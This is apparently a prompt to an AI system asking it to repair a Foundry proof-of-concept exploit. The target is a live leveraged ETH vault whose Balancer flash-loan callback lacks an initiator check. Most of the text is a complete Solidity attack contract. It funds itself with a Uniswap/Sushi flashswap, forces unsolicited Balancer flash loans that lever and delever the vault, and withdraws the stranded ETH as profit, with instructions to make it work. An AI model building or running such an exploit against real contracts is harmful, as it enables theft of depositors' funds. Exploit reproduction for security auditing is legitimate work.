You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Anyone can invoke the Balancer callback and force arbitrary leveraging or deleveraging
- claim: `receiveFlashLoan()` only checks `msg.sender == balancer` and the raw `userData` bytes, but never verifies that this vault initiated the flash loan or that a flash-loan operation is currently expected. Because Balancer flash loans are permissionless, any external account can ask Balancer to call this vault with `userData = "0x1"` or `"0x2"` and force `_deposit()` or `_withdraw()` against the vault's live position.
- impact: A permissionless attacker can repeatedly rebalance the vault without consent, paying flash-loan fees out of shared equity, forcing unexpected leverage changes, stranding large amounts of ETH on the contract while the vault remains unpaused, or even re-levering paused funds back into Aave. This breaks the vault's trust model and can drive material fund loss, insolvency, or set up the direct theft paths described below.
- exploit_paths: ["Attacker calls Balancer `flashLoan(recipient = vault, token = WETH, amount = chosenAmount, userData = \"0x1\")` to force `_deposit()`", "Or attacker calls Balancer `flashLoan(recipient = vault, token = WETH, amount <= getDebt(), userData = \"0x2\")` to force `_withdraw()`", "Balancer invokes `receiveFlashLoan()` on the vault", "Vault executes the requested rebalance even though no vault function initiated it"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IEFLeverVault {
    function ef_token() external view returns (address);
    function balancer() external view returns (address);
    function weth() external view returns (address);
    function mlr() external view returns (uint256);
    function getFeeParam() external view returns (uint256);
    function getVolume() external view returns (uint256);
    function getDebt() external view returns (uint256);
    function is_paused() external view returns (bool);
    function deposit(uint256 amount) external payable;
    function withdraw(uint256 amount) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xe39fd820B58f83205Db1D9225f28105971c3D309;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777Ce9e4f2Ac;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    uint256 internal _profitAmount;
    bool public attempted;

    address internal _activePair;
    uint256 internal _activeBorrowAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (attempted) {
            return;
        }
        attempted = true;

        uint256 startingWealth = _totalWealthInEthTerms();
        IEFLeverVault vault = IEFLeverVault(TARGET);

        // Preserve the core finding path: a third party can permissionlessly make
        // Balancer call the vault with userData == "0x1" even though the vault did
        // not initiate that flash loan itself.
        _attemptUnauthorizedDeposit(vault);

        uint256[7] memory seedCandidates = [
            uint256(0.03 ether),
            0.1 ether,
            0.3 ether,
            1 ether,
            3 ether,
            10 ether,
            30 ether
        ];

        for (uint256 i = 0; i < seedCandidates.length; i++) {
            try this.executeFlashswap(seedCandidates[i]) {
                if (_totalWealthInEthTerms() > startingWealth) {
                    break;
                }
            } catch {}
        }

        _finalizeProfit(startingWealth);
    }

    function executeFlashswap(uint256 seedWeth) external {
        require(msg.sender == address(this), "self only");
        require(seedWeth != 0, "zero seed");

        address pair = _locateFundingPair();
        require(pair != address(0), "pair missing");

        _activePair = pair;
        _activeBorrowAmount = seedWeth;

        address token0 = IUniswapV2PairLike(pair).token0();
        uint256 amount0Out = token0 == WETH ? seedWeth : 0;
        uint256 amount1Out = token0 == WETH ? 0 : seedWeth;

        // Realistic bootstrap funding: a V2-style flashswap temporarily lends the
        // verifier pre-existing on-chain WETH so it can mint the minimum live vault
        // shares needed to later withdraw the ETH stranded by the unauthorized
        // Balancer deleveraging callback. The vulnerable action remains the vault's
        // permissionless Balancer callback; the flashswap is only transient funding.
        IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), abi.encode(seedWeth));

        _activePair = address(0);
        _activeBorrowAmount = 0;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == _activePair, "bad pair");
        require(sender == address(this), "bad sender");

        uint256 seedWeth = abi.decode(data, (uint256));
        uint256 borrowed = amount0 != 0 ? amount0 : amount1;
        require(seedWeth == _activeBorrowAmount && borrowed == seedWeth, "bad borrow");

        IEFLeverVault vault = IEFLeverVault(TARGET);
        IERC20Like efToken = IERC20Like(vault.ef_token());

        IWETHLike(WETH).withdraw(seedWeth);
        vault.deposit{value: seedWeth}(seedWeth);

        uint256 shareBalance = efToken.balanceOf(address(this));
        require(shareBalance != 0, "no shares");

        // Keep the exploit sequence aligned with the reported paths: first show the
        // same missing-intent bug can force an unsolicited leverage step, then force
        // an unsolicited deleverage step that strands ETH for theft via withdraw().
        _attemptUnauthorizedDeposit(vault);
        require(_attemptExploit(vault, efToken, shareBalance), "exploit failed");

        uint256 repayment = _v2Repayment(seedWeth);
        _ensureWeth(repayment);
        require(IERC20Like(WETH).transfer(msg.sender, repayment), "repay failed");
    }

    function attemptForcedDeposit(uint256 forcedLoanAmount) external {
        require(msg.sender == address(this), "self only");
        require(forcedLoanAmount > 0, "bad forced amount");

        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = WETH;
        amounts[0] = forcedLoanAmount;

        IBalancerVaultLike(IEFLeverVault(TARGET).balancer()).flashLoan(TARGET, tokens, amounts, bytes("0x1"));
    }

    function attemptForcedUnwind(uint256 forcedLoanAmount, uint256 shareAmount) external {
        require(msg.sender == address(this), "self only");

        IEFLeverVault vault = IEFLeverVault(TARGET);
        IERC20Like efToken = IERC20Like(vault.ef_token());

        uint256 debtBefore = vault.getDebt();
        require(debtBefore > 0, "no debt");
        require(shareAmount > 0 && shareAmount <= efToken.balanceOf(address(this)), "bad shares");
        require(forcedLoanAmount > 0 && forcedLoanAmount < debtBefore, "bad forced amount");

        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = WETH;
        amounts[0] = forcedLoanAmount;

        IBalancerVaultLike(vault.balancer()).flashLoan(TARGET, tokens, amounts, bytes("0x2"));

        require(vault.getDebt() < debtBefore, "debt unchanged");
        require(address(TARGET).balance > 0, "no stranded eth");

        vault.withdraw(shareAmount);
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptUnauthorizedDeposit(IEFLeverVault vault) internal returns (bool) {
        uint256 forcedLoanAmount = _chooseForcedDepositAmount(vault);
        if (forcedLoanAmount == 0) {
            return false;
        }

        try this.attemptForcedDeposit(forcedLoanAmount) {
            return true;
        } catch {
            return false;
        }
    }

    function _attemptExploit(
        IEFLeverVault vault,
        IERC20Like efToken,
        uint256 shareBalance
    ) internal returns (bool) {
        uint256 debtBefore = vault.getDebt();
        uint256 totalSupply = efToken.totalSupply();
        if (shareBalance == 0 || debtBefore == 0 || totalSupply == 0) {
            return false;
        }

        uint256[6] memory nestedLoanTargets = [
            uint256(0.01 ether),
            0.03 ether,
            0.1 ether,
            0.3 ether,
            1 ether,
            3 ether
        ];

        for (uint256 i = 0; i < nestedLoanTargets.length; i++) {
            uint256 residualDebt = _ceilDiv(nestedLoanTargets[i] * totalSupply, shareBalance);
            if (residualDebt == 0 || residualDebt >= debtBefore) {
                continue;
            }

            try this.attemptForcedUnwind(debtBefore - residualDebt, shareBalance) {
                return true;
            } catch {}
        }

        uint16[10] memory residualBps = [uint16(1), 2, 5, 10, 20, 50, 100, 200, 500, 1000];
        for (uint256 i = 0; i < residualBps.length; i++) {
            uint256 residualDebt = (debtBefore * residualBps[i]) / 10000;
            if (residualDebt == 0 || residualDebt >= debtBefore) {
                continue;
            }

            try this.attemptForcedUnwind(debtBefore - residualDebt, shareBalance) {
                return true;
            } catch {}
        }

        return false;
    }

    function _chooseForcedDepositAmount(IEFLeverVault vault) internal view returns (uint256) {
        if (vault.weth() != WETH) {
            return 0;
        }

        uint256 idleEth = address(TARGET).balance;
        if (idleEth == 0) {
            return 0;
        }

        uint256 chosenAmount = idleEth / 2;
        if (chosenAmount == 0) {
            chosenAmount = 1;
        }

        uint256 debt = vault.getDebt();
        if (debt != 0 && chosenAmount > debt) {
            chosenAmount = debt;
        }
        return chosenAmount;
    }

    function _locateFundingPair() internal view returns (address pair) {
        pair = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(WETH, USDC);
        if (pair != address(0)) return pair;

        pair = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(WETH, DAI);
        if (pair != address(0)) return pair;

        pair = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(WETH, USDT);
        if (pair != address(0)) return pair;

        pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(WETH, USDC);
        if (pair != address(0)) return pair;

        pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(WETH, DAI);
        if (pair != address(0)) return pair;

        pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(WETH, USDT);
    }

    function _ensureWeth(uint256 needed) internal {
        uint256 wethBalance = IERC20Like(WETH).balanceOf(address(this));
        if (wethBalance >= needed) {
            return;
        }

        uint256 shortfall = needed - wethBalance;
        require(address(this).balance >= shortfall, "insufficient eth");
        IWETHLike(WETH).deposit{value: shortfall}();
    }

    function _finalizeProfit(uint256 startingWealth) internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            IWETHLike(WETH).deposit{value: ethBalance}();
        }

        uint256 endingWealth = IERC20Like(WETH).balanceOf(address(this));
        if (endingWealth > startingWealth) {
            _profitAmount = endingWealth - startingWealth;
        }
    }

    function _totalWealthInEthTerms() internal view returns (uint256) {
        return address(this).balance + IERC20Like(WETH).balanceOf(address(this));
    }

    function _v2Repayment(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 1000) / 997) + 1;
    }

    function _ceilDiv(uint256 x, uint256 y) internal pure returns (uint256) {
        if (x == 0) {
            return 0;
        }
        return ((x - 1) / y) + 1;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: flashloan(recipient = vault, token = weth, amount = chosenamount, userdata = "0x1"), _deposit(), flashloan(recipient = vault, token = weth, amount <= getdebt(), userdata = "0x2"), _withdraw(), receiveflashloan(); generated code does not cover paths indexes: 0, 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
